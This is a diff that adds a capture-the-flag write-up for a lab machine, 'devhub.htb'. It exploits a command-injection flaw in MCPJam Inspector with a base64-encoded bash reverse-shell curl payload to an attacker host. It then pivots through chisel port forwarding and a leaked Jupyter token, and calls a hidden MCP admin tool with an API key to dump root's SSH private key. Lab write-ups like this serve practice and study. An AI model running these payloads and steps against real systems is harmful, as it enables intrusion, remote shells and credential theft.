@@ -1,0 +1,32 @@
+1. Nmap showed 22,80 and 6274 open ports,I add devhub.htb hostname to /etc/hosts
+2. I found that port 6274 hosts MCPJAM Inspector v1.4.2, which is vulnerable to CVE-2026-23744. We can send a POST request to /api/mcp/connect with arguments such as command and args, and it executes those commands without any security checks.
+3. I craft a payload using curl:
+ENCODED=$(printf 'bash -i >& /dev/tcp/{attackerIP}/{attackerPORT} 0>&1' | base64 -w0); curl -X POST http://devhub.htb:6274/api/mcp/connect -H 'Content-Type: application/json' --data-raw "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"echo $ENCODED | base64 -d | bash\"],\"env\":{}},\"serverId\":\"pwned\"}"
+4. After getting a reverse shell as mcp-dev, I enumerate the system and find that a Jupyter Notebook instance is running on port 8888 on 127.0.0.1 as the analyst user.
+5. I forwarded the port using chisel: 
+Server - ./chisel server --reverse -p 9000
+Client - ./chisel client attackerIP:9000 R:8888:127.0.0.1:8888
+6. The Jupyter instance requires a token for authentication. During enumeration, I find the token in /etc/systemd/system/multi-user.target.wants/jupyter.service.
+7. After entering the token, I can open a terminal as analyst and retrieve user.txt. 
+8. While enumerating as mcp-dev, I also discover through ps auxf | grep python that root owns a file called server.py. mcp-dev does not have permission to read it, but analyst does. After reading the file, I find the VALID_API_KEY and a hidden tool called ops._admin_dump, which can dump the root user's SSH keys through a service running on localhost:5000.
+9. I create a payload to dump the ssh_keys, 
+curl \
+-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
+-H "Content-Type: application/json" \
+-X POST \
+http://127.0.0.1:5000/tools/call \
+-d '{
+  "name":"ops._admin_dump",
+  "arguments":{
+    "target":"ssh_keys",
+    "confirm":true
+  }
+}'
+
+10. The response returns the root user's private key. On my system, I save the output as root_ssh_id, format it using:
+printf "%b" "$(cat root_ssh_id)" > root_id_rsa
+and then set the correct permissions:
+chmod 600 root_id_rsa
+11. I obtain a root shell using:
+ssh -i root_id_rsa root@devhub.htb
+12. After getting a root shell, I read root.txt and the machine is pwned.
